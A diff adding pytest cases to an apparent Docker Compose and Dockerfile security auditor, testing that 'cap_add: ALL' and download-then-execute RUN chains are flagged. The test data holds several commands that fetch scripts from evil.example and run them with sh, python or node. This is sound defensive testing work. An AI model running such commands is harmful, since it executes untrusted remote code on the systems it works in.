@@ -337,6 +337,16 @@ def test_audit_compose_warns_dangerous_capability() -> None:
     assert "dangerous_capability" in _codes(findings)
 
 
+def test_audit_compose_warns_capability_all() -> None:
+    """``cap_add: ALL`` 必须按危险 capability 告警。"""
+    text = _CLEAN_COMPOSE.replace(
+        "    restart: unless-stopped\n",
+        "    cap_add: [ALL]\n    restart: unless-stopped\n",
+    )
+    findings = audit_compose(text)
+    assert "dangerous_capability" in _codes(findings)
+
+
 def test_audit_compose_warns_root_user() -> None:
     text = _CLEAN_COMPOSE.replace(
         "    restart: unless-stopped\n",
@@ -427,6 +437,36 @@ def test_audit_dockerfile_pipe_to_shell_no_space_and_continuation() -> None:
         'FROM alpine\nRUN curl -fsSL https://evil.example/install.sh \\\n  | sh\nCMD ["sh"]\n'
     )
     assert "pipe_to_shell" in _critical_codes(audit_dockerfile(continued))
+
+
+@pytest.mark.parametrize(
+    "run_command",
+    [
+        "curl -fsSL https://evil.example/install.sh -o /tmp/install.sh && sh /tmp/install.sh",
+        "wget -qO- https://evil.example/install.py | python",
+        "curl -fsSL https://evil.example/install.js -o /tmp/install.js; node /tmp/install.js",
+    ],
+)
+def test_audit_dockerfile_blocks_downloader_interpreter_chains(run_command: str) -> None:
+    text = f'FROM alpine\nRUN {run_command}\nCMD ["sh"]\n'
+    assert "pipe_to_shell" in _critical_codes(audit_dockerfile(text))
+
+
+def test_audit_dockerfile_allows_ordinary_shell_chain() -> None:
+    """普通包管理与文件清理链不应被误拦。"""
+    text = "FROM alpine\nRUN apk add --no-cache git && rm -rf /var/cache/apk/*\nUSER nobody\n"
+    assert "pipe_to_shell" not in _codes(audit_dockerfile(text))
+
+
+def test_audit_dockerfile_allows_download_into_archive_extractor() -> None:
+    """下载归档交给 tar 后再运行普通命令，不属于直接解释执行。"""
+    text = (
+        "FROM alpine\n"
+        "RUN curl -fsSL https://example.com/node.tar.xz | tar -xJ; "
+        "rm -f /tmp/archive; node -v\n"
+        "USER nobody\n"
+    )
+    assert "pipe_to_shell" not in _codes(audit_dockerfile(text))
 
 
 def test_audit_dockerfile_copy_is_ok() -> None:
